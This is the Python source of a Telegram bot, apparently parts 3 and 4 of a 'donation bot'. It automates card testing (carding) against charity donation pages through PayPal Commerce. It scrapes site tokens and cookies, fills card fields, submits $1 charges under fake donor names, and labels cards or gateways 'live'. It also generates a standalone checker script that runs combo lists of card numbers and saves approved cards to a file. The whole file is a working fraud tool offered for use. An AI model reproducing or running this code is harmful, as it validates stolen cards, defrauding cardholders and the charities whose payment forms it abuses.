        """اضغط زر الدفع"""
        try:
            pay_keywords = ['donate', 'pay', 'submit', 'complete', 'continue', 'next', 'confirm', 'proceed', 'give']
            
            for keyword in pay_keywords:
                try:
                    # أزرار بالنص
                    xpath = f"//button[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), '{keyword}')] | //input[@type='submit']"
                    elements = self.driver.find_elements(By.XPATH, xpath)
                    for el in elements:
                        try:
                            if el.is_displayed() and el.is_enabled():
                                if self.click_safely(el):
                                    self.progress(f"🖱️ Clicked pay button: {keyword}")
                                    time.sleep(2)
                                    return True
                        except:
                            continue
                except:
                    continue
            
            # CSS Selectors
            css_selectors = [
                'button[type="submit"]',
                'input[type="submit"]',
                '.give-submit',
                '[class*="submit-button"]',
                '[class*="pay-button"]',
                '[class*="donate-button"]',
            ]
            
            for selector in css_selectors:
                try:
                    elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
                    for el in elements:
                        if el.is_displayed() and el.is_enabled():
                            if self.click_safely(el):
                                self.progress(f"🖱️ Clicked submit")
                                time.sleep(2)
                                return True
                except:
                    continue
            
            return False
        except:
            return False
    
    def fill_card_details(self, number, exp_month, exp_year, cvc):
        """ملء بيانات الفيزا"""
        try:
            time.sleep(2)
            
            # ═══ رقم الفيزا ═══
            card_selectors = [
                'input[name*="card_number"]',
                'input[name*="cardnumber"]',
                'input[name*="card-number"]',
                'input[id*="card_number"]',
                'input[id*="cardnumber"]',
                'input[id*="card-number"]',
                'input[placeholder*="Card Number"]',
                'input[placeholder*="card number"]',
                'input[autocomplete="cc-number"]',
                'input[data-payment="card-number"]',
                'input[name="number"]',
                'input[name*="cardNumber"]',
                'input[aria-label*="card number"]',
                'input[aria-label*="Card Number"]',
            ]
            
            for selector in card_selectors:
                try:
                    elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
                    for el in elements:
                        if el.is_displayed():
                            if self.fill_safely(el, number):
                                self.progress(f"💳 Card number entered")
                                break
                    break
                except:
                    continue
            
            time.sleep(0.5)
            
            # ═══ الشهر ═══
            month_selectors = [
                'input[name*="expiry_month"]',
                'input[name*="exp_month"]',
                'input[name*="expmonth"]',
                'input[name*="exp-month"]',
                'input[name*="month"]',
                'input[id*="expiry_month"]',
                'input[id*="exp_month"]',
                'input[id*="expiry-month"]',
                'input[placeholder*="MM"]',
                'input[autocomplete="cc-exp-month"]',
                'input[name*="expMonth"]',
                'select[name*="month"]',
            ]
            
            for selector in month_selectors:
                try:
                    elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
                    for el in elements:
                        if el.is_displayed():
                            tag = el.tag_name.lower()
                            if tag == 'select':
                                try:
                                    from selenium.webdriver.support.ui import Select
                                    sel = Select(el)
                                    sel.select_by_value(exp_month)
                                    self.progress(f"💳 Month selected")
                                except:
                                    try:
                                        sel.select_by_visible_text(exp_month)
                                    except:
                                        pass
                            else:
                                if self.fill_safely(el, exp_month):
                                    self.progress(f"💳 Month entered")
                            break
                    break
                except:
                    continue
            
            time.sleep(0.3)
            
            # ═══ السنة ═══
            year_selectors = [
                'input[name*="expiry_year"]',
                'input[name*="exp_year"]',
                'input[name*="expyear"]',
                'input[name*="exp-year"]',
                'input[name*="year"]',
                'input[id*="expiry_year"]',
                'input[id*="exp_year"]',
                'input[id*="expiry-year"]',
                'input[placeholder*="YY"]',
                'input[autocomplete="cc-exp-year"]',
                'input[name*="expYear"]',
                'select[name*="year"]',
            ]
            
            for selector in year_selectors:
                try:
                    elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
                    for el in elements:
                        if el.is_displayed():
                            tag = el.tag_name.lower()
                            if tag == 'select':
                                try:
                                    from selenium.webdriver.support.ui import Select
                                    sel = Select(el)
                                    try:
                                        sel.select_by_value(exp_year)
                                    except:
                                        try:
                                            sel.select_by_visible_text(f"20{exp_year}")
                                        except:
                                            try:
                                                sel.select_by_visible_text(exp_year)
                                            except:
                                                pass
                                    self.progress(f"💳 Year selected")
                                except:
                                    pass
                            else:
                                if self.fill_safely(el, exp_year):
                                    self.progress(f"💳 Year entered")
                            break
                    break
                except:
                    continue
            
            time.sleep(0.3)
            
            # ═══ CVV ═══
            cvv_selectors = [
                'input[name*="cvv"]',
                'input[name*="cvc"]',
                'input[name*="cvv2"]',
                'input[name*="security_code"]',
                'input[name*="securityCode"]',
                'input[id*="cvv"]',
                'input[id*="cvc"]',
                'input[id*="security_code"]',
                'input[placeholder*="CVV"]',
                'input[placeholder*="CVC"]',
                'input[placeholder*="Security"]',
                'input[autocomplete="cc-csc"]',
                'input[aria-label*="CVV"]',
                'input[aria-label*="CVC"]',
            ]
            
            for selector in cvv_selectors:
                try:
                    elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
                    for el in elements:
                        if el.is_displayed():
                            if self.fill_safely(el, cvc):
                                self.progress(f"💳 CVV entered")
                            break
                    break
                except:
                    continue
            
            # ═══ ابحث في Iframes لو ملقاش الحقول ═══
            try:
                iframes = self.driver.find_elements(By.TAG_NAME, 'iframe')
                for iframe in iframes:
                    try:
                        self.driver.switch_to.frame(iframe)
                        # جرب نفس الـ selectors جوه الـ iframe
                        for sel in card_selectors[:5]:
                            try:
                                els = self.driver.find_elements(By.CSS_SELECTOR, sel)
                                for el in els:
                                    if el.is_displayed():
                                        self.fill_safely(el, number)
                                        break
                            except:
                                pass
                        self.driver.switch_to.default_content()
                    except:
                        try:
                            self.driver.switch_to.default_content()
                        except:
                            pass
            except:
                pass
            
            return True
        except Exception as e:
            print(f"Error fill_card_details: {e}")
            return False
    
    def click_final_pay(self):
        """اضغط زر الدفع النهائي"""
        try:
            time.sleep(1)
            
            final_keywords = ['pay', 'donate', 'complete', 'submit', 'confirm', 'place order', 'finish']
            
            for keyword in final_keywords:
                try:
                    xpath = f"//button[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), '{keyword}')] | //input[@type='submit']"
                    elements = self.driver.find_elements(By.XPATH, xpath)
                    for el in elements:
                        try:
                            if el.is_displayed() and el.is_enabled():
                                if self.click_safely(el):
                                    self.progress(f"🖱️ Clicked final pay: {keyword}")
                                    time.sleep(3)
                                    return True
                        except:
                            continue
                except:
                    continue
            
            return False
        except:
            return False
    
    def wait_for_result(self, timeout=15):
        """استنى الرد الحقيقي من الموقع"""
        try:
            # Smart wait - استنى رد يظهر
            start = time.time()
            
            while time.time() - start < timeout:
                try:
                    text = self.driver.find_element(By.TAG_NAME, 'body').text
                    text_lower = text.lower()
                    
                    # لو لقينا رد واضح → ارجع
                    for live in LIVE_RESPONSES:
                        if live.lower() in text_lower:
                            return live
                    
                    # لو لقينا كلمات تدل على نجاح
                    success_words = ['thank you', 'success', 'complete', 'approved', 'confirmed']
                    for sw in success_words:
                        if sw in text_lower:
                            return "CHARGE 1.0"
                except:
                    pass
                
                time.sleep(1)
            
            # جيب النص الكامل
            try:
                text = self.driver.find_element(By.TAG_NAME, 'body').text
            except:
                text = ""
            
            html = self.driver.page_source
            
            return self.parse_response(text, html)
        except Exception as e:
            return f"Wait Error: {str(e)[:100]}"
    
    def parse_response(self, text, html):
        """استخراج الرد"""
        text_lower = text.lower()
        
        # ابحث في JSON
        json_patterns = [
            r'"issue"\s*:\s*"([^"]+)"',
            r'"error"\s*:\s*"([^"]+)"',
            r'"message"\s*:\s*"([^"]+)"',
            r'"name"\s*:\s*"([^"]+)"',
        ]
        
        for pattern in json_patterns:
            matches = re.findall(pattern, html, re.IGNORECASE)
            for match in matches:
                match_upper = match.upper()
                for live in LIVE_RESPONSES:
                    if live.upper() in match_upper:
                        if 'INSUFFICIENT' in match_upper:
                            return "INSUFFICIENT_FUNDS"
                        if 'ORDER_NOT_APPROVED' in match_upper:
                            return "Payer cannot pay for this transaction."
                        return live
        
        # ابحث في النص
        for live in LIVE_RESPONSES:
            if live.lower() in text_lower:
                if 'insufficient' in live.lower():
                    return "INSUFFICIENT_FUNDS"
                return live
        
        if text.strip():
            return f"Site: {' '.join(text.split())[:200]}"
        
        return "UNKNOWN_SITE_RESPONSE"
    
    def extract_tokens(self):
        """استخراج التوكنات"""
        html = self.html
        
        # Client ID
        patterns = [
            r'client-id=["\']([^"\']+)["\']',
            r'client_id["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'data-client-id=["\']([^"\']+)["\']',
            r'clientId["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})["\']',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                self.tokens['client_id'] = match.group(1)
                break
        
        # Client Token
        token_patterns = [
            r'data-client-token=["\']([^"\']+)["\']',
            r'client-token=["\']([^"\']+)["\']',
            r'client_token=["\']([^"\']+)["\']',
        ]
        
        for pattern in token_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                enc = match.group(1)
                try:
                    padded = enc + '=' * (-len(enc) % 4)
                    decoded = base64.b64decode(padded).decode('utf-8', errors='ignore')
                    token_match = re.search(r'"accessToken":"([^"]+)"', decoded)
                    if token_match:
                        self.tokens['access_token'] = token_match.group(1)
                        break
                except:
                    pass
                self.tokens['client_token'] = enc
                break
        
        # Form Data
        inputs = re.findall(r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"', html)
        for name, value in inputs:
            self.form_data[name] = value
    
    def close(self):
        """إغلاق المتصفح"""
        try:
            if self.driver:
                self.driver.quit()
        except:
            pass
    
    def run(self, card_number=TEST_CARD_NUMBER, exp_month=TEST_CARD_EXPIRY_MONTH,
            exp_year=TEST_CARD_EXPIRY_YEAR, cvc=TEST_CARD_CVC):
        """الوظيفة الرئيسية - تشغيل كل حاجة"""
        
        if not HAS_SELENIUM:
            return "Selenium not installed"
        
        try:
            # ═══ 1. Setup Driver ═══
            self.progress("🚀 Starting browser...")
            if not self.setup_driver():
                return "Driver Setup Failed"
            
            # ═══ 2. Open Page ═══
            self.progress(f"🌐 Opening site...")
            try:
                self.driver.get(self.url)
                time.sleep(2)
            except Exception as e:
                self.close()
                return f"Page Load Error: {str(e)[:80]}"
            
            # ═══ 3. Detect Cloudflare/Captcha ═══
            if self.detect_cloudflare():
                self.progress("❌ Cloudflare detected")
                self.close()
                return "CLOUDFLARE_DETECTED"
            
            if self.detect_captcha():
                self.progress("❌ Captcha detected")
                self.close()
                return "CAPTCHA_DETECTED"
            
            # ═══ 4. Quick Scan ═══
            self.progress("🔍 Quick scanning...")
            has_donation = self.quick_scan()
            
            if not has_donation:
                self.progress("❌ No donation keywords found")
                self.close()
                return "NO_DONATION_FOUND"
            
            # ═══ 5. Extract Tokens ═══
            self.html = self.driver.page_source
            self.extract_tokens()
            
            # ═══ 6. Find & Click Donate Button ═══
            self.progress("🎯 Finding donate button...")
            clicked = self.find_and_click_donate()
            
            if not clicked:
                # جرب تدور على form مباشرة
                self.progress("⚠️ No button found, looking for form...")
                form = self.find_form()
                if not form:
                    self.progress("❌ No form found")
                    self.close()
                    return "NO_FORM_FOUND"
            
            # ═══ 7. Wait for form load ═══
            time.sleep(2)
            self.html = self.driver.page_source
            self.extract_tokens()
            
            # ═══ 8. Fill Form ═══
            self.progress("📝 Filling form...")
            self.fill_form()
            
            # ═══ 9. Accept Terms ═══
            self.progress("☑️ Accepting terms...")
            self.accept_terms()
            
            # ═══ 10. Set Amount ═══
            self.progress("💰 Setting amount...")
            self.set_amount()
            
            # ═══ 11. Select Payment Method ═══
            self.progress("💳 Selecting payment method...")
            self.select_payment_method()
            
            # ═══ 12. Click Pay ═══
            self.progress("🖱️ Clicking pay...")
            self.click_pay()
            
            # ═══ 13. Wait for card form ═══
            time.sleep(3)
            
            # ═══ 14. Fill Card Details ═══
            self.progress("💳 Entering card details...")
            self.fill_card_details(card_number, exp_month, exp_year, cvc)
            
            # ═══ 15. Click Final Pay ═══
            self.progress("🖱️ Clicking final pay...")
            self.click_final_pay()
            
            # ═══ 16. Wait for Result ═══
            self.progress("⏳ Waiting for result...")
            result = self.wait_for_result(timeout=15)
            
            # ═══ 17. Close ═══
            self.close()
            return result
            
        except Exception as e:
            self.close()
            return f"Error: {str(e)[:100]}"
            
            # ═══════════════════════════════════════════════════════════
# ⚡ HUMAN-LIKE DONATION BOT v8.0 - Part 3/4
# ═══════════════════════════════════════════════════════════

# ═══════════════════════════════════════════════════════════
# ═══ Request-based Checker (سريع للـ Mass) ═══
# ═══════════════════════════════════════════════════════════
class RequestChecker:
    """فحص سريع بـ requests - للمواقع بدون Selenium"""
    
    def __init__(self, url):
        self.url = url
        self.r = requests.Session()
        self.r.verify = False
        self.uu = UserAgent() if HAS_FAKE_UA else SimpleUA()
        self.parsed = urlparse(url)
        self.host = self.parsed.netloc
        self.path = self.parsed.path
        if self.parsed.query:
            self.path += f"?{self.parsed.query}"
        self.client_id = None
        self.access_token = None
        self.client_token = None
        self.form_data = {}
        self.ajax_url = None
        self.html = ""
        self.first_name = ["James", "John", "Robert", "Michael", "William"]
        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
        self.email = f"{random.choice(self.first_name)}{random.randint(100,999)}@gmail.com"
        self.donation = "1.00"
    
    def init_and_extract(self):
        try:
            headers = {
                'user-agent': self.uu.random,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
            }
            response = self.r.get(f'https://{self.host}{self.path}', headers=headers, timeout=15)
            self.html = response.text
            self.cookies = dict(response.cookies)
            self._extract_client_id()
            self._extract_form_data()
            self._extract_ajax_url()
            self._extract_tokens()
        except:
            pass
    
    def _extract_client_id(self):
        patterns = [
            r'client-id=["\']([^"\']+)["\']',
            r'client_id["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'data-client-id=["\']([^"\']+)["\']',
            r'clientId["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})["\']',
            r'"clientId"\s*:\s*"([^"]+)"',
        ]
        for pattern in patterns:
            match = re.search(pattern, self.html, re.IGNORECASE)
            if match:
                self.client_id = match.group(1)
                return
    
    def _extract_form_data(self):
        inputs = re.findall(r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"', self.html)
        for name, value in inputs:
            self.form_data[name] = value
    
    def _extract_ajax_url(self):
        if 'admin-ajax.php' in self.html:
            self.ajax_url = f'https://{self.host}/wp-admin/admin-ajax.php'
    
    def _extract_tokens(self):
        patterns = [
            r'data-client-token=["\']([^"\']+)["\']',
            r'client-token=["\']([^"\']+)["\']',
            r'client_token=["\']([^"\']+)["\']',
        ]
        for pattern in patterns:
            match = re.search(pattern, self.html, re.IGNORECASE)
            if match:
                enc = match.group(1)
                try:
                    padded = enc + '=' * (-len(enc) % 4)
                    decoded = base64.b64decode(padded).decode('utf-8', errors='ignore')
                    token_match = re.search(r'"accessToken":"([^"]+)"', decoded)
                    if token_match:
                        self.access_token = token_match.group(1)
                        return
                except:
                    pass
                self.client_token = enc
                return
    
    def charge(self, card):
        """محاولة الدفع"""
        try:
            if not self.ajax_url:
                return "NO_AJAX"
            
            # 1. Create order
            order_id = self._create_order()
            if not order_id:
                return "DECLINED"
            
            # 2. Confirm payment
            parts = card.split("|")
            if len(parts) < 4:
                return "Invalid card format"
            
            n, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
            if "20" in yy:
                yy = yy.split("20")[1]
            expiry = f"20{yy}-{mm}"
            
            confirm_result = self._confirm_payment(order_id, n, expiry, cvc)
            
            return confirm_result
        except Exception as e:
            return f"Error: {str(e)[:100]}"
    
    def _create_order(self):
        if not self.ajax_url:
            return None
        
        form_data = self.form_data.copy()
        form_data.update({
            'give-amount': self.donation,
            'payment-mode': 'paypal-commerce',
            'give_first': random.choice(self.first_name),
            'give_last': random.choice(self.last_name),
            'give_email': self.email,
            'give-gateway': 'paypal-commerce',
        })
        
        headers = {
            'user-agent': self.uu.random,
            'accept': 'application/json',
            'x-requested-with': 'XMLHttpRequest',
            'origin': f'https://{self.host}',
            'referer': f'https://{self.host}{self.path}',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }
        
        for action in ['give_paypal_commerce_create_order', 'give_create_order']:
            try:
                response = self.r.post(self.ajax_url, params={'action': action}, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if 'data' in data and isinstance(data['data'], dict) and 'id' in data['data']:
                            return data['data']['id']
                        if 'id' in data:
                            return data['id']
                    except:
                        pass
            except:
                continue
        return None
    
    def _confirm_payment(self, order_id, n, expiry, cvc):
        tokens = []
        if self.client_token:
            tokens.append(self.client_token)
        if self.access_token:
            tokens.append(self.access_token)
        if self.client_id:
            tokens.append(self.client_id)
        
        for token in tokens:
            headers = {
                'authorization': f'Bearer {token}',
                'paypal-client-metadata-id': self.client_id or '',
                'user-agent': self.uu.random,
                'paypal-request-id': str(uuid.uuid4()),
            }
            data = {
                'payment_source': {
                    'card': {
                        'number': n,
                        'expiry': expiry,
                        'security_code': cvc,
                        'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
                    }
                },
                'application_context': {'vault': False},
            }
            try:
                response = self.r.post(
                    f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
                    headers=headers,
                    json=data,
                    timeout=15
                )
                if response.status_code == 200:
                    result = response.json()
                    result_str = str(result).upper()
                    
                    if 'INSUFFICIENT_FUNDS' in result_str:
                        return "INSUFFICIENT_FUNDS"
                    if 'EXPIRED_CARD' in result_str:
                        return "EXPIRED_CARD"
                    if 'ORDER_NOT_APPROVED' in result_str:
                        return "Payer cannot pay for this transaction."
                    if 'RESTRICTED_OR_INACTIVE_ACCOUNT' in result_str:
                        return "RESTRICTED_OR_INACTIVE_ACCOUNT"
                    
                    if 'details' in result:
                        for detail in result['details']:
                            issue = detail.get('issue', '')
                            if issue:
                                return issue
            except:
                continue
        
        return "DECLINED"


# ═══════════════════════════════════════════════════════════
# ═══ Check Functions ═══
# ═══════════════════════════════════════════════════════════

def check_with_selenium(link, chat_id=None, message_id=None):
    """
    فحص بـ Selenium مع تحديثات لحظية + سكرين شوت
    """
    progress_updates = []
    screenshots = []
    
    def progress_callback(msg):
        progress_updates.append(msg)
        if chat_id and message_id:
            try:
                # ابعت تحديث
                text = f"🔍 <b>Scanning...</b>\n\n📝 {msg}\n\n🔗 <code>{link}</code>"
                safe_edit_message(chat_id, message_id, text)
            except:
                pass
    
    def screenshot_callback(filepath, name):
        screenshots.append((filepath, name))
        if chat_id:
            try:
                safe_send_photo(chat_id, filepath, caption=f"📸 {name}")
                try:
                    os.remove(filepath)
                except:
                    pass
            except:
                pass
    
    try:
        bot_obj = HumanLikeSelenium(
            url=link,
            headless=True,
            progress_callback=progress_callback,
            screenshot_callback=screenshot_callback
        )
        
        result = bot_obj.run()
        
        # تحديد Live/Dead
        is_live = False
        for live in LIVE_RESPONSES:
            if live.lower() in result.lower():
                is_live = True
                break
        
        return {
            'link': link,
            'live': is_live,
            'respons': result,
            'tokens': bot_obj.tokens,
            'form_data': bot_obj.form_data,
            'method': 'selenium',
            'progress': progress_updates,
            'screenshots': len(screenshots)
        }
    except Exception as e:
        return {
            'link': link,
            'live': False,
            'respons': f'Error: {str(e)[:100]}',
            'method': 'selenium'
        }


def check_with_requests(link):
    """
    فحص سريع بـ requests - للـ Mass
    """
    try:
        checker = RequestChecker(link)
        checker.init_and_extract()
        
        # Quick check - هل فيه كلمات تبرع؟
        html_lower = checker.html.lower()
        has_donation = False
        
        for kw in DONATE_KEYWORDS + PAYMENT_KEYWORDS:
            if kw.lower() in html_lower:
                has_donation = True
                break
        
        if not has_donation:
            return {
                'link': link,
                'live': False,
                'respons': 'NO_DONATION_FOUND',
                'method': 'requests'
            }
        
        # محاولة الدفع
        result = checker.charge(TEST_CARD)
        
        # تحديد Live/Dead
        is_live = False
        for live in LIVE_RESPONSES:
            if live.lower() in result.lower():
                is_live = True
                break
        
        return {
            'link': link,
            'live': is_live,
            'respons': result,
            'client_id': checker.client_id or '',
            'access_token': checker.access_token or '',
            'client_token': checker.client_token or '',
            'form_data': checker.form_data,
            'ajax_url': checker.ajax_url or '',
            'cookies': getattr(checker, 'cookies', {}),
            'url': checker.host,
            'inurl': checker.path,
            'method': 'requests'
        }
    except Exception as e:
        return {
            'link': link,
            'live': False,
            'respons': f'Error: {str(e)[:100]}',
            'method': 'requests'
        }


def generate_gateway_code(result):
    """توليد كود Python جاهز للبوابة"""
    client_id = result.get('client_id', '')
    access_token = result.get('access_token', '')
    client_token = result.get('client_token', '')
    form_data = result.get('form_data', {})
    ajax_url = result.get('ajax_url', '')
    cookies = result.get('cookies', {})
    url = result.get('url', '')
    inurl = result.get('inurl', '')
    
    return f'''import requests, re, random, time, base64, uuid
from fake_useragent import UserAgent

class PayPal:
    def __init__(self):
        self.first_name = ["James", "John", "Robert", "Michael", "William"]
        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
        self.donation = "1.00"
        self.r = requests.Session()
        self.r.verify = False
        self.uu = UserAgent()
        self.client_id = "{client_id}"
        self.access_token = "{access_token}"
        self.client_token = "{client_token}"
        self.form_data = {form_data}
        self.ajax_url = "{ajax_url}"
        self.cookies = {cookies}
        self.url = "{url}"
        self.inurl = "{inurl}"
        self.email = f"{{random.choice(self.first_name)}}{{random.randint(100,999)}}@gmail.com"

    def Charge(self, ccx):
        try:
            parts = ccx.strip().split("|")
            if len(parts) < 4:
                return "Invalid card format"
            n, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
            if "20" in yy:
                yy = yy.split("20")[1]
            expiry = f"20{{yy}}-{{mm}}"
            
            order_id = self._create_order()
            if not order_id:
                return "DECLINED"
            
            tokens = []
            if self.client_token:
                tokens.append(self.client_token)
            if self.access_token:
                tokens.append(self.access_token)
            if self.client_id:
                tokens.append(self.client_id)
            
            for token in tokens:
                he4 = {{
                    'authorization': f'Bearer {{token}}',
                    'paypal-client-metadata-id': self.client_id or '',
                    'user-agent': self.uu.random,
                    'paypal-request-id': str(uuid.uuid4()),
                }}
                da3 = {{
                    'payment_source': {{
                        'card': {{
                            'number': n,
                            'expiry': expiry,
                            'security_code': cvc,
                            'attributes': {{'verification': {{'method': 'SCA_WHEN_REQUIRED'}}}},
                        }}
                    }},
                    'application_context': {{'vault': False}},
                }}
                try:
                    res = self.r.post(
                        f'https://cors.api.paypal.com/v2/checkout/orders/{{order_id}}/confirm-payment-source',
                        headers=he4, json=da3, timeout=15
                    )
                    if res.status_code == 200:
                        result_str = str(res.json()).upper()
                        if 'INSUFFICIENT_FUNDS' in result_str:
                            return "INSUFFICIENT_FUNDS"
                        if 'EXPIRED_CARD' in result_str:
                            return "EXPIRED_CARD"
                        if 'ORDER_NOT_APPROVED' in result_str:
                            return "Payer cannot pay for this transaction."
                        break
                except:
                    continue
            
            return "DECLINED"
        except Exception as e:
            return f"Error: {{e}}"

    def _create_order(self):
        if not self.ajax_url:
            return None
        form_data = self.form_data.copy()
        form_data.update({{
            'give-amount': self.donation,
            'payment-mode': 'paypal-commerce',
            'give_first': random.choice(self.first_name),
            'give_last': random.choice(self.last_name),
            'give_email': self.email,
            'give-gateway': 'paypal-commerce',
        }})
        headers = {{
            'user-agent': self.uu.random,
            'accept': 'application/json',
            'x-requested-with': 'XMLHttpRequest',
            'origin': f'https://{{self.url}}',
            'referer': f'https://{{self.url}}{{self.inurl}}',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }}
        for action in ['give_paypal_commerce_create_order', 'give_create_order']:
            try:
                response = self.r.post(self.ajax_url, params={{'action': action}}, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
                if response.status_code == 200:
                    data = response.json()
                    if 'data' in data and isinstance(data['data'], dict) and 'id' in data['data']:
                        return data['data']['id']
                    if 'id' in data:
                        return data['id']
            except:
                continue
        return None

if __name__ == '__main__':
    Getat = 'PayPal 1$'
    print(f'Cheker {{Getat}}')
    Br = input('Enter Numer (Manual : 1 - Combo : 2) : ')
    if Br == '1':
        while True:
            ar = input('Enter Card ( n | mm | yy | cvc ): ')
            rr = PayPal()
            resulti = rr.Charge(ar)
            if 'CHARGE' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                with open('Approved Card.txt', "a") as f:
                    f.write(ar + f': {{resulti}} > {{Getat}}')
            print('Response: ' + resulti)
            time.sleep(5)
    else:
        noy = 0
        cr = input('Enter Name Combo: ')
        with open(cr, "r") as f:
            crads = f.read().splitlines()
            for P in crads:
                noy += 1
                try:
                    rr = PayPal()
                    resulti = rr.Charge(P)
                except Exception as e:
                    resulti = f'Error {{e}}'
                if 'CHARGE' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                    with open('Approved Card.txt', "a") as f:
                        f.write(P + ': {{resulti}} > {{Getat}}')
                print(f'[{{noy}}] ' + P + '  >>  ' + resulti)
                time.sleep(13)'''
                
                # ═══════════════════════════════════════════════════════════
# ⚡ HUMAN-LIKE DONATION BOT v8.0 - Part 4/4
# ═══════════════════════════════════════════════════════════

# ═══════════════════════════════════════════════════════════
# ═══ Bot Commands ═══
# ═══════════════════════════════════════════════════════════

@bot.message_handler(commands=["start"])
def start(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        safe_send_message(message.chat.id, '🚫 You are blocked.')
        return
    
    user_id = message.from_user.id
    userr = message.from_user.first_name
    username = message.from_user.username or "No Username"

    IU = f'''🚀 <b>Welcome To Donation Bot</b> 🌟
━━━━━━━━━━━━━━━━━━━━
👤 <b>Name:</b> {userr}
📛 <b>Username:</b> @{username}
🆔 <b>ID:</b> <code>{user_id}</code>
━━━━━━━━━━━━━━━━━━━━
💎 <b>PayPal Gateway</b> → /paypal
💰 <b>Mass Extract</b> → /mass
━━━━━━━━━━━━━━━━━━━━
⚡ <b>Dev:</b> @FAWZY30'''
    
    safe_send_message(message.chat.id, IU)


@bot.message_handler(commands=['paypal'])
def check_paypal(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        safe_send_message(message.chat.id, '🚫 You are blocked.')
        return
    
    ko = safe_send_message(message.chat.id, "🔍 <b>Starting scan...</b>")
    if not ko:
        return
    
    try:
        parts = message.text.split(maxsplit=1)
        if len(parts) != 2:
            safe_edit_message(message.chat.id, ko.message_id, '📝 <b>Usage:</b>\n\n<code>/paypal https://xxxxxxx.xxx/xxxx</code>')
            return
        
        link = parts[1].strip()
        if not link.startswith(("http://", "https://")):
            safe_edit_message(message.chat.id, ko.message_id, "❌ <b>Invalid link format</b>")
            return
        
        # تشغيل Selenium
        result = check_with_selenium(link, chat_id=message.chat.id, message_id=ko.message_id)
        
        if result['live']:
            # بوابة حية
            file_name = f'gateway_{int(time.time())}.py'
            try:
                code = generate_gateway_code(result)
                with open(file_name, "w", encoding="utf-8") as f:
                    f.write(code)
                
                caption = f'''💎 <b>Live Gateway Found!</b>
━━━━━━━━━━━━━━━━━━━━
🔗 <b>Link:</b> <code>{link}</code>
💬 <b>Response:</b> <code>{result['respons']}</code>
🛠️ <b>Method:</b> <code>{result.get('method', 'selenium')}</code>
━━━━━━━━━━━━━━━━━━━━
⚡ <b>Dev:</b> @FAWZY30'''
                
                safe_send_document(message.chat.id, file_name, caption=caption)
                try:
                    os.remove(file_name)
                except:
                    pass
            except Exception as e:
                safe_send_message(message.chat.id, f"⚠️ Code gen error: {str(e)[:80]}")
        else:
            # Dead gateway
            safe_edit_message(
                message.chat.id,
                ko.message_id,
                f'''❌ <b>Dead Gateway</b>
━━━━━━━━━━━━━━━━━━━━
🔗 <b>Link:</b> <code>{link}</code>
📝 <b>Response:</b> <code>{result['respons']}</code>
━━━━━━━━━━━━━━━━━━━━
⚡ <b>Dev:</b> @FAWZY30'''
            )
    
    except Exception as e:
        try:
            safe_edit_message(message.chat.id, ko.message_id, f"❌ <b>Error:</b> {str(e)[:100]}")
        except:
            pass


@bot.message_handler(commands=['mass'])
def mass_start(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        safe_send_message(message.chat.id, '🚫 You are blocked.')
        return
    
    msg = safe_send_message(message.chat.id, "📁 <b>Send a .txt file with links (one per line):</b>")
    if msg:
        bot.register_next_step_handler(msg, process_mass_file)


@bot.message_handler(commands=['stop'])
def stop_mass(message):
    user_id = message.from_user.id
    if user_id in processing_status:
        processing_status[user_id]['stop_flag'] = True
        safe_send_message(message.chat.id, "🛑 <b>Stopping...</b>")
    else:
        safe_send_message(message.chat.id, "❌ <b>No active process.</b>")


def process_mass_file(message):
    """معالجة ملف Mass - Request-based فقط (أسرع بكتير)"""
    if not message.document:
        safe_send_message(message.chat.id, "❌ <b>Please send a .txt file.</b>")
        return
    
    try:
        file_info = safe_get_file(message.document.file_id)
        if not file_info:
            safe_send_message(message.chat.id, "❌ Failed to get file.")
            return
        
        downloaded_file = safe_download_file(file_info.file_path)
        if not downloaded_file:
            safe_send_message(message.chat.id, "❌ Failed to download file.")
            return
        
        links = downloaded_file.decode('utf-8', errors='ignore').splitlines()
        links = [link.strip() for link in links if link.strip()]
        
        if not links:
            safe_send_message(message.chat.id, "❌ <b>File is empty.</b>")
            return
        
        total = len(links)
        user_id = message.from_user.id
        chat_id = message.chat.id
        
        processing_status[user_id] = {
            'total': total,
            'processed': 0,
            'live': 0,
            'dead': 0,
            'lock': threading.Lock(),
            'current_url': '',
            'current_respons': '',
            'stop_flag': False,
            'done': False
        }
        
        status_msg = safe_send_message(chat_id, f"""📊 File #1 - Scanning links...
━━━━━━━━━━━━━━━━━━
